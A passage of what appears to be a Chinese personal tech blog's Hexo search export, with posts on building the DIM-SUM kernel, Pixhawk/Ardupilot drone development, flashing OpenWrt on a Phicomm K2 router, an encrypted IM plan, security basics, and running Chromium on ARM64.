<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rutk1t0r@ubuntu:~/dev/dim-sum/dim-sum/src$ ./build.sh </span><br><span class="line">  CHK     include/linux/version.h</span><br><span class="line">  CHK     include/generated/utsrelease.h</span><br><span class="line">  CALL    scripts/checksyscalls.sh</span><br><span class="line">grep: scripts/../arch/x86/syscalls/syscall_32.tbl: No such file or directory</span><br><span class="line">  CHK     include/generated/compile.h</span><br><span class="line">  CC      kernel/<span class="built_in">sched</span>/core.o</span><br><span class="line">  LD      kernel/<span class="built_in">sched</span>/built-in.o</span><br><span class="line">  LD      kernel/built-in.o</span><br><span class="line">  LD      vmlinux.o</span><br><span class="line">  MODPOST vmlinux.o</span><br><span class="line">WARNING: modpost: Found 20 section mismatch(es).</span><br><span class="line">To see full details build your kernel with:</span><br><span class="line"><span class="string">&#x27;make CONFIG_DEBUG_SECTION_MISMATCH=y&#x27;</span></span><br><span class="line">  GEN     .version</span><br><span class="line">  CHK     include/generated/compile.h</span><br><span class="line">  UPD     include/generated/compile.h</span><br><span class="line">  CC      init/version.o</span><br><span class="line">  LD      init/built-in.o</span><br><span class="line">  LD      .tmp_vmlinux1</span><br><span class="line">  KSYM    .tmp_kallsyms1.S</span><br><span class="line">  AS      .tmp_kallsyms1.o</span><br><span class="line">  LD      .tmp_vmlinux2</span><br><span class="line">  KSYM    .tmp_kallsyms2.S</span><br><span class="line">  AS      .tmp_kallsyms2.o</span><br><span class="line">  LD      vmlinux</span><br><span class="line">  SYSMAP  System.map</span><br><span class="line">  SYSMAP  .tmp_System.map</span><br><span class="line">  OBJCOPY arch/arm64/boot/Image</span><br><span class="line">  Kernel: arch/arm64/boot/Image is ready</span><br><span class="line">rutk1t0r@ubuntu:~/dev/dim-sum/dim-sum/src$ </span><br></pre></td></tr></table></figure>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rutk1t0r@ubuntu:~/dev/dim-sum/dim-sum/src$ ./run.sh </span><br><span class="line">WARNING: Image format was not specified <span class="keyword">for</span> <span class="string">&#x27;./dim-sum.img&#x27;</span> and probing guessed raw.</span><br><span class="line">         Automatically detecting the format is dangerous <span class="keyword">for</span> raw images, write operations on block 0 will be restricted.</span><br><span class="line">         Specify the <span class="string">&#x27;raw&#x27;</span> format explicitly to remove the restrictions.</span><br><span class="line">W: /etc/qemu-ifup: no bridge <span class="keyword">for</span> guest interface found</span><br><span class="line">simple console is ready.</span><br><span class="line">timer_rate is 62500000.</span><br><span class="line">io scheduler noop registered(default)</span><br><span class="line">xby_debug <span class="keyword">in</span> virtio_mmio_setup, 1, 554d4551.</span><br><span class="line">xby_debug <span class="keyword">in</span> virtio_mmio_setup, 2, 554d4551.</span><br><span class="line">xby_debug <span class="keyword">in</span> virtio_dev_match, id-&gt;vendor:-1, id-&gt;device:2.</span><br><span class="line">xby_debug <span class="keyword">in</span> virtio_dev_match, dev-&gt;vendor:1431127377, dev-&gt;device:2.</span><br><span class="line">xby_debug <span class="keyword">in</span> virtblk_probe, vda</span><br><span class="line">......</span><br><span class="line">LWIP-1.4.1 TCP/IP initialized.</span><br><span class="line">xby_debug <span class="keyword">in</span> __cpu_launch, 1.</span><br><span class="line">xby_debug <span class="keyword">in</span> psci_launch_cpu, pa is 0000000040158020.</span><br><span class="line">xby_debug <span class="keyword">in</span> __cpu_launch, 2.</span><br><span class="line">xby_debug <span class="keyword">in</span> psci_launch_cpu, pa is 0000000040158020.</span><br><span class="line">xby_debug <span class="keyword">in</span> __cpu_launch, 3.</span><br><span class="line">xby_debug <span class="keyword">in</span> psci_launch_cpu, pa is 0000000040158020.</span><br><span class="line">	                                                    </span><br><span class="line">	<span class="comment">##############################################</span></span><br><span class="line">	<span class="comment">#                                            #</span></span><br><span class="line">	<span class="comment">#  *   *   ***   *****  ****    ***   *****  #</span></span><br><span class="line">	<span class="comment">#  *   *  *   *    *    *   *  *   *    *    #</span></span><br><span class="line">	<span class="comment">#  *   *  *   *    *    *   *  *   *    *    #</span></span><br><span class="line">	<span class="comment">#  *****  *   *    *    ****   *   *    *    #</span></span><br><span class="line">	<span class="comment">#  *   *  *   *    *    *      *   *    *    #</span></span><br><span class="line">	<span class="comment">#  *   *  *   *    *    *      *   *    *    #</span></span><br><span class="line">	<span class="comment">#  *   *   ***     *    *       ***     *    #</span></span><br><span class="line">	<span class="comment">#                                            #</span></span><br><span class="line">	<span class="comment">##############################################</span></span><br><span class="line">	                                              </span><br><span class="line">[dim-sum@hot pot]<span class="comment"># xby_debug in task2, enter</span></span><br><span class="line">xby_debug <span class="keyword">in</span> task1, enter</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/images/DIM-SUM_shell_ps.png" alt="DIM-SUM_shell_ps.png"></p>
<blockquote>
<p>这里是修改过后的代码，将通过creat_process实现执行子命令</p>
</blockquote>
<h1 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h1><ul>
<li>实现sys_wait4回收task_struct等更丰富的接口实现</li>
<li>支持x86等更丰富的arch</li>
<li>用户态程序</li>
<li>理解作者的问题和《答案.docx》</li>
<li>…</li>
</ul>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>DIM-SUM</tag>
        <tag>OS内核</tag>
      </tags>
  </entry>
  <entry>
    <title>无人机学习概况</title>
    <url>/embpgp.github.io/2016/08/25/%E6%97%A0%E4%BA%BA%E6%9C%BA%E5%AD%A6%E4%B9%A0%E6%A6%82%E5%86%B5/</url>
    <content><![CDATA[<h1 id="Pixhawk-Ardupilot-交叉编译工具链-QGC-AP"><a href="#Pixhawk-Ardupilot-交叉编译工具链-QGC-AP" class="headerlink" title="Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)"></a>Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)</h1><span id="more"></span>


<p>参考资料:<br><a href="http://www.nephen.com/arrange/archive.html" title="老吴">老吴学长教程:http://www.nephen.com/arrange/archive.html</a><br><a href="http://ardupilot.org/copter/index.html">Ardupilot:http://ardupilot.org/copter/index.html</a><br><a href="http://dev.px4.io/">Pixhawk开发者:http://dev.px4.io/</a></p>
<hr>
<h1 id="Pixhawk"><a href="#Pixhawk" class="headerlink" title="Pixhawk"></a>Pixhawk</h1><p>首先稍微介绍一下Pixhawk,它很贵，是的．国外原装的估计的是700多，国内某宝上有很多公司自己仿照它做的板子也得588.目前据我所知道的某宝上卖的最便宜的Pixhawk是梦创团队做的，由于是手工焊制因此还有待提高其工业水平．不扯淡了，想玩无人机的朋友应该都知道大疆这个公司，目前它的无人机市场占有率很高，详情可以搜一搜相关新闻．大疆也很贵(其实要想玩无人机还是得掏钱啊)，上次我们学校一老师让我们观看一下大疆的一款飞机，好像是”悟”系列的，说是从美国带回来的，20000RMB．<del>__</del>.所以对于我们一般的爱好者怎么办的？国外开源之王–Pixhawk是首选．硬件开源(为啥能够轻易仿制)，固件开源(降低二次开发难度)，上位机也开源(扩展高级功能)．基本上能够满足无人机平台各个专业的需求．以前它叫做PX4FMU+PX4IO,其实对应到真正的板子上就是一个是stm32f4的芯片，另一个是stm32f1的芯片，主要是它俩加起来搞在一块板子上就是Pixhawk．PX4FMU负责进行高级的浮点运算等，PX4IO负责低级的定时器输出PWM等，两者共同运行了一个叫做Nuttx的嵌入式实时操作系统．如果是买回来的套件，板子肯定已经上载好了bootloader，如果是自己制作，必须在焊接好之后用Jlink等工具首先将bootloader上载进去，而后再通过交叉编译工具链或者上位机用USB接口连接电脑和板子下固件到板子．基础的板子一般只能飞基础的功能，比如自稳模式，定高模式啦．如果要飞高级模式，比如悬停，留待，自动模式啥的得需要GPS或者光流计等可选的硬件设备．所以，还是得舍得花钱…其实说到开源飞控平台有很多，比如国内做得还可以的匿名团队，有兴趣的小伙伴可以去了解一下．下图是梦创的板子.<br><img src="/images/pixhawk.jpg" alt="梦创的板子"></p>
<h1 id="Ardupilot"><a href="#Ardupilot" class="headerlink" title="Ardupilot"></a>Ardupilot</h1><p>这个是一个固件或者说是软件，相对于一般的用户来说就是固件，因为不去更改它．作为开发者来说就是一个软件平台，必须要进行二次更改或者移植去定制自己的功能．首先要说到APM团队，也是一个无人机开发团队，其实最早是PX4团队在Pixhawk上开发出了固件，然后APM也借助了他们的劳动成果在Pixhawk上加入了自己的一个应用程序<strong>ArduCopter</strong>，这个程序作为一个进程在Nuttx里面被nsh脚本启动．而后再进行各种运算和控制…可能玩过航模的童鞋知道ArduCopter,这玩意儿支持很多架构，不只多旋翼，还包括固定翼和小车等．因为APM团队早期是在基于Avr芯片的arduino板子上跑的软件APM2.x，后来发现低端的资源配置已经不能满足大量的运算了，正巧来了Pixhawk，因此APM团队仍然在完成移植和新功能的开发工作上面．我们为什么不用PX4的固件转而来学习APM的固件呢？答案是简单一些，功能上它们俩差不多，但是在功能的源码实现上不太一样．我们可以分别从各自的github仓库里面fork并clone代码到本地用编辑工具(如sublime等)打开查看就知道了．至于怎么分析代码架构，请先学好单片机等相关知识以及飞行器的基本原理，最好有很好的高数基础和信号滤波的概念．而后，学好C++,就可以开始你的DIY之旅了．如果英文够好的话直接去官网看开发者教程就可以了．下图可以看到ArduCopter也是支持很多硬件平台的，我们编译的时候键入<code>make px4-v2</code>即可．键入<code>make px4-v2-upload</code>即可上载代码．我的开发平台是ubuntu 16.04 amd64.<br><img src="/images/targets.png" alt="targets"></p>
<h1 id="交叉编译工具链"><a href="#交叉编译工具链" class="headerlink" title="交叉编译工具链"></a>交叉编译工具链</h1><p>熟悉嵌入式开发的筒子们肯定都知道，我们在写好代码编译后是需要借助第三方电路结构(例如Jlink,串口有时候也支持)将程序从PC下载到板子上去．这是主要是由于指令集不一样所以要进行交叉编译，除非板子上已经装好了系统了…具体到开发Pixhawk所用到的编译器就是<code>arm-none-eabi-gcc</code>家族,详情安装方式参考官网<a href="http://ardupilot.org/dev/docs/building-px4-for-linux-with-make.html">APM</a>或者<a href="http://dev.px4.io/starting-installing-linux.html">PX4</a>都可以，也可以看我<a href="http://www.nephen.com/2016/01/introduction-to-start-ArduPilot">学长的教程</a>,只要搭建好这个环境编译APM或者PX4原生固件都是可以的．建议开发平台为Linux，win上面可能会出很多问题，也不建议在win上装Linux虚拟机,因为我当时就出了问题一直木有解决…最好装个双系统啥的．再说，Linux足够安全(相对概念,具体看设计)，不是吗？下图是我的arm-none-eabi-gcc版本号.<br><img src="/images/arm-none-eabi-gcc.png" alt="arm-none-eabi-gcc"></p>
<h1 id="上位机"><a href="#上位机" class="headerlink" title="上位机"></a>上位机</h1><p>一款好的飞控开发出来，如果没有易于调参的上位机很是麻烦．Ardupilot里面大大小小的参数百多个，最经典的几个PID参数必须要调的．当然运气好机架和参数恰好对应了就不必这么麻烦了．还有些可选的硬件，在上位机里面修改比取修改源码方便多了．Linux上推荐使用QGC和APMPlanner,QGC和APMPlanner都是基于Qt写出来的上位机，直接支持Linux,Win,Mac．APM Planner而且还可以分析飞控上SD卡的飞行记录数据．而Mission Planner是用.net写出来的，在Linux上的话需要安装mono环境才能跑．对于校准加速度计和磁力计的话MP特别麻烦，转很久可能都转不到某些点．而且这里面的上位机几款都是开源的．有兴趣的都可以研究一下mavlink协议以及图形渲染相关编程技术．下图是APMPlanner的截图．<br><img src="/images/APMPlanner.png" alt="APMPlanner"></p>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>去年加入的实验室，学stm32f1基础知识，从定时器输出PWM控制电调和定时器输入捕获PWM获取遥控器量，到SPI总线协议收发射频信号，I2C协议获取IMU传感器数据，到基础互补滤波和姿态融合算法，串级PID算法控制PWM输出量．一路走来对飞行器有了基本的认识，今年寒假开始的Pixhawk学习，到近期的电赛结束，算是画上了一个简单的分号吧．感谢各位帮助过我的筒子们，加油吧，学弟学妹们，明年电赛好好干．</p>
]]></content>
      <categories>
        <category>study</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>emb</tag>
        <tag>uav</tag>
        <tag>pixhawk</tag>
      </tags>
  </entry>
  <entry>
    <title>没这么好的&quot;馅饼&quot;</title>
    <url>/embpgp.github.io/2016/10/28/%E6%B2%A1%E8%BF%99%E4%B9%88%E5%A5%BD%E7%9A%84%E9%A6%85%E9%A5%BC/</url>
    <content><![CDATA[<blockquote>
<p>自己本来想买个路由器来着,想着几十块钱也是钱,一直到同学跟我说某东上有推销,而鹅厂的丘丘广告栏居然也有,抱着试了的心态购了一台斐讯K2.</p>
</blockquote>
  <span id="more"></span>
<p>  参考资料:<br>  <a href="http://bbs.newifi.com/thread-3351-1-1.html">http://bbs.newifi.com/thread-3351-1-1.html</a><br>  <a href="http://www.shaoit.com/feixunshuaji.html">http://www.shaoit.com/feixunshuaji.html</a><br>  <a href="http://www.qqgzs.com/archives/k2-v22-148.html">http://www.qqgzs.com/archives/k2-v22-148.html</a><br>  <a href="http://www.openwrt.org.cn/bbs/thread-60-1-1.html">http://www.openwrt.org.cn/bbs/thread-60-1-1.html</a><br>  <a href="http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/">http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/</a><br>  <a href="http://wiki.openwrt.org/zh-cn/doc/start">OpenWrt官方文档:http://wiki.openwrt.org/zh-cn/doc/start</a></p>
<hr>
<h2 id="到货"><a href="#到货" class="headerlink" title="到货"></a>到货</h2><p>看起来很不错的样子,包装很漂亮.先不说返现的事情咯,根据基本的教程大概知道该路由器比一般的路由器功能还是丰富一些.从网上一查才知道居然带有<a href="http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/">后门</a>,吓得我赶紧连开机都不试了就开始找各种固件.</p>
<h2 id="刷刷刷"><a href="#刷刷刷" class="headerlink" title="刷刷刷"></a>刷刷刷</h2><p>根据上述链接基本的一些教程一步一步来,首先知道了原生固件也阉割了很多功能(ssh和telnet服务被禁),估计也是为了加大一般发烧友DIY的难度.我猜测有很多路由器厂商做的路由器都有漏洞的,不管是无意的还是有意的硬编码的后门,还是用开源的东西安全一些,毕竟有社区在维护,当然自己也可以贡献力量.就如近期炒得很火热的米国一半的互联网企业遭受DDOS攻击致使互联网企业域名无法解析而瘫痪,研究称是祖国某几家生产监控设备的厂商的监控产品受到Mirai恶意软件(蠕虫)等的劫持和感染而加入了僵尸网络同时对米国各大互联网企业进行”测试”…为了安全,我决定还是刷<strong>OpenWrt</strong>.当然也有同学刷其他固件的,也不错.从<a href="http://soundrain.net/2016/04/25/%E6%96%90%E8%AE%AFK2%E8%B7%AF%E7%94%B1%E5%88%B7openwrt%E5%AE%9E%E8%B7%B5%E6%95%99%E7%A8%8B/">这里</a>提供的云盘链接下载的K2配置文件发现不能恢复,后来从<a href="http://www.qqgzs.com/archives/k2-v22-148.html">这里</a>下载的配置文件就可以用了,当然,我也不能打包票地说breed没有问题,毕竟目前也还没有实力去逆向工程分析.只能选择信任网友们了.某些教程提供的一件刷机不知是否可行,我的不行,看URL应该是直接从另外一个URL Wget一个脚本到本地执行,但是我的居然报404错误…后来还是果断选择了先解决breed,而后再刷OpenWrt固件,如果不信任上述百度云盘的文件,可以去<a href="https://downloads.openwrt.org/chaos_calmer/15.05.1/ramips/mt7620/">官网这里</a>(注意型号配对)去查md5和sha校验值,我已经查过了,没有问题,至于使用的过程中仍被强行注入广告应该是运营商的问题了.<br><img src="/images/OpenWrt.png" alt="OpenWrt"><br><img src="/images/Openwrt_sha256_compare.png" alt="Openwrt_sha256_compare.png"></p>
<h2 id="测试玩玩"><a href="#测试玩玩" class="headerlink" title="测试玩玩"></a>测试玩玩</h2><p>关于OpenWrt在开源社区应该很知名,因此文档和使用手册也应该俱全.具体的可以多学习下高级用法和某些服务器的配置以及一些常见的开发.首先进入Web端设置好登录密码和root密码,同时使能ssh服务,把自己的公钥证书复制到相应的地方保存和应用.接下来通过PC的以太网口或者Wifi(保证先配置好)<code>ssh root@IP_Address</code>即可直接免密钥登录OpenWrt了,瞬间又找到了Linux的感觉,可以知道这里的shell是用的busybox,因为/bin/sh是busybox的一个软链接(其实/bin目录下绝大部分的命令都指向了busybox,足以见得它的强大),在嵌入式Linux中很常见.建议只允许从局域网中登录和管理,提高安全性.<br><img src="/images/OpenWrt_ssh.png" alt="OpenWrt_ssh"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>东西不是白送的,除了泄露个人理财信息之外技术上还进行了一些限制和”数据采集”,作为小白鼠也得Get一些技能来保护自己,实在不放心在一台中间设备开个tcpdump或者wireshark在WAN口一直监听即可测试.</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>Configure</tag>
        <tag>network security</tag>
      </tags>
  </entry>
  <entry>
    <title>端到端加密IM预想</title>
    <url>/embpgp.github.io/2017/03/05/%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86IM%E9%A2%84%E6%83%B3/</url>
    <content><![CDATA[<blockquote>
<p>从古代烽火通信到二战电台破译，从ARPANET被研发出来至目前互联网，消息加解密会是永恒的主题。近期Google宣布SHA-1发现碰撞，后斯诺登时代信息泄露事件仍在不断发生。一直想学习相关技术并应用于实践，在此进行大致预想。</p>
</blockquote>
<span id="more"></span>

<hr>
<ul>
<li>基本开发语言想用python来开发，因为python跨平台，三大PC平台都支持。</li>
<li>而UI设计方面为了简单直接使用黑窗口(习惯了Linux的shell了)。</li>
<li>基于CS架构所以客户端和服务端都必须开源实现。</li>
<li>应该必须支持单聊和群聊，当然前期可以不考虑大的并发量和大量用户注册等相关复杂业务，重在功能实现。</li>
<li>最重要的是实现端到端的加解密。</li>
<li>......</li>
</ul>
<hr>
<p>当然上述功能网络上已经有很多优秀的软件实现了(诸如Telegram等)，并且可能做的还要好，而我的想法就是”造造轮子”，学习并应用相关技术才是目的。有兴趣可以一起学习并探讨…</p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全基本要素及对策</title>
    <url>/embpgp.github.io/2016/09/18/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E6%9C%AC%E8%A6%81%E7%B4%A0%E5%8F%8A%E5%AF%B9%E7%AD%96/</url>
    <content><![CDATA[<blockquote>
<p>昨天又请教了熊老板关于网络安全的基本要素,当时他上课的时候听了课然后又忘记了,现在总结如下,具体含义可参考各种百科和博文(以下定义源自百度百科)</p>
</blockquote>
<span id="more"></span>


<h2 id="机密性"><a href="#机密性" class="headerlink" title="机密性"></a>机密性</h2><p>定义:保证机密信息不被窃听，或窃听者不能了解信息的真实含义。<br>策略:一般为对称加解密算法(例如AES,DES等,某些CPU内部可直接集成硬件加解密部件来加速实现信息的加解密)</p>
<h2 id="完整性"><a href="#完整性" class="headerlink" title="完整性"></a>完整性</h2><p>定义:保证数据的一致性，防止数据被非法用户篡改。<br>策略:利用MAC(消息验证码)机制,一般为MD5,SHA等算法</p>
<h2 id="可用性"><a href="#可用性" class="headerlink" title="可用性"></a>可用性</h2><p>定义:保证合法用户对信息和资源的使用不会被不正当地拒绝。(典型的例如DDOS攻击)<br>策略:网络安全中暂无好的方案,信息安全中可用数据备份来缓解.</p>
<h2 id="可控性"><a href="#可控性" class="headerlink" title="可控性"></a>可控性</h2><p>定义:对信息的传播及内容具有控制能力。<br>策略:各种访问控制,例如ACL包过滤,防火墙等机制.</p>
<h2 id="不可抵赖性"><a href="#不可抵赖性" class="headerlink" title="不可抵赖性"></a>不可抵赖性</h2><p>定义:建立有效的责任机制，防止用户否认其行为，这一点在电子商务中是极其重要的。<br>策略:数字签名,用公钥密码机制,如RSA等.</p>
]]></content>
      <categories>
        <category>study</category>
        <category>work</category>
      </categories>
      <tags>
        <tag>network security</tag>
        <tag>information security</tag>
      </tags>
  </entry>
  <entry>
    <title>chromium支持arm64架构验证</title>
    <url>/embpgp.github.io/2025/03/12/chromium%E6%94%AF%E6%8C%81arm64%E6%9E%B6%E6%9E%84%E9%AA%8C%E8%AF%81/</url>
    <content><![CDATA[<blockquote>
<p>html2pdf ?</p>
</blockquote>
<span id="more"></span>

<p>参考资料：<br><a href="https://www.hikunpeng.com/document/detail/zh/kunpengfaq/productfaq/osfaq/os_faq_0011.html">CentOS系统下内存页Page Size如何从64K切换到4K</a><br><a href="https://bbs.chinauos.com/zh/post/18054">https://bbs.chinauos.com/zh/post/18054</a></p>
<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>有一个case是需要在ARM64架构下支持html2pdf，以及crawler功能，其引用的库为puppeteer(或者python下叫pyppeteer),<br>通过检索后了解到<a href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html">google官网</a>没有为ARM64架构支持发行版的二进制包，从别的地方搜索可知ubuntu 18.04默认的发型版带了，因此需要做迁移验证。</p>
<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>用虚拟化工具安装官方镜像或者直接去云平台服务商购买虚拟机均可以，通过<code>apt</code>等工具装上后，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root@VM-1-28-ubuntu:~<span class="comment"># cat /etc/os-release </span></span><br><span class="line">NAME=<span class="string">&quot;Ubuntu&quot;</span></span><br><span class="line">VERSION=<span class="string">&quot;18.04.6 LTS (Bionic Beaver)&quot;</span></span><br><span class="line">ID=ubuntu</span><br><span class="line">ID_LIKE=debian</span><br><span class="line">PRETTY_NAME=<span class="string">&quot;Ubuntu 18.04.6 LTS&quot;</span></span><br><span class="line">VERSION_ID=<span class="string">&quot;18.04&quot;</span></span><br><span class="line">HOME_URL=<span class="string">&quot;https://www.ubuntu.com/&quot;</span></span><br><span class="line">SUPPORT_URL=<span class="string">&quot;https://help.ubuntu.com/&quot;</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">&quot;https://bugs.launchpad.net/ubuntu/&quot;</span></span><br><span class="line">PRIVACY_POLICY_URL=<span class="string">&quot;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&quot;</span></span><br><span class="line">VERSION_CODENAME=bionic</span><br><span class="line">UBUNTU_CODENAME=bionic</span><br><span class="line">root@VM-1-28-ubuntu:~<span class="comment"># uname -r</span></span><br><span class="line">4.15.0-213-generic</span><br><span class="line">root@VM-1-28-ubuntu:~<span class="comment"># uname -a</span></span><br><span class="line">Linux VM-1-28-ubuntu 4.15.0-213-generic <span class="comment">#224-Ubuntu SMP Mon Jun 19 13:29:44 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux</span></span><br><span class="line">root@VM-1-28-ubuntu:~<span class="comment"># apt install chromium-browser</span></span><br><span class="line"></span><br><span class="line">root@VM-1-28-ubuntu:~<span class="comment"># chromium-browser -v</span></span><br><span class="line">[13070:13070:0312/192614.751212:ERROR:zygote_host_impl_linux.cc(100)] Running as root without --no-sandbox is not supported. See https://crbug.com/638180.</span><br><span class="line">root@VM-1-28-ubuntu:~<span class="comment"># chromium-browser --no-sandbox -v</span></span><br><span class="line">[13159:13159:0312/192626.645634:ERROR:ozone_platform_x11.cc(239)] Missing X server or <span class="variable">$DISPLAY</span></span><br><span class="line">[13159:13159:0312/192626.645678:ERROR:env.cc(255)] The platform failed to initialize.  Exiting.</span><br><span class="line">root@VM-1-28-ubuntu:~<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>安装相关库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root@VM-1-28-ubuntu:~<span class="comment">#  apt install alsa-utils libatk1.0-0 libcups2 libgtk-3-0 fonts-ipafont-gothic libxcomposite1 libxcursor1 libxdamage1 libxext6 libxi6  libxrandr2 libxss1 libxtst6 libpango-1.0-0 xfonts-100dpi xfonts-75dpi xfonts-cyrillic  xfonts-base xfonts-scalable x11-utils libnss3 -y</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>生成pdf，可能会有如下的乱码，可以尝试导入字体库来解决。<br><img src="/images/chrome_01.png" alt="chrome_01.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-1-28-ubuntu:~<span class="comment">#  chromium-browser --headless --no-sandbox --disable-gpu --print-to-pdf=./2.pdf  https://www.baidu.com</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="支持容器场景部署"><a href="#支持容器场景部署" class="headerlink" title="支持容器场景部署"></a>支持容器场景部署</h1><p>上述已经在虚拟机场景跑通了，但是一般业务部署在容器上下文，通过修改基础镜像并打包容器部署到k8s的时候，发现一模一样的镜像，在k8s运行出core，core的方式是收到trap信号被终止，堆栈信息不完整。因此怀疑是host机的问题，有可能是glibc版本不兼容，但是对比用虚拟机跑，glibc版本一致，后面重新做了一个ubuntu 16.04的容器镜像，运行在k8s上的时候，报错<code>FATAL:page_allocator_internals_posix.h(224)] Check failed: . : Invalid argument (22)</code>，因此怀疑是内存分页的问题，再次对比容器和虚拟机的分页大小，执行<code>getconf PAGE_SIZE</code>，发现k8s上的大小为64K，而正常虚拟机仍为4K，此时只能怀疑是chromium默认采用了4K大小的逻辑编译二进制。后续的兼容方案就是修改服务的部署，采用更换host机，若host机仍为64K的操作系统，则可以更新rpm等包，手动替换内核，host机上再运行k8s或者docker即可，至此问题解决。</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
</search>
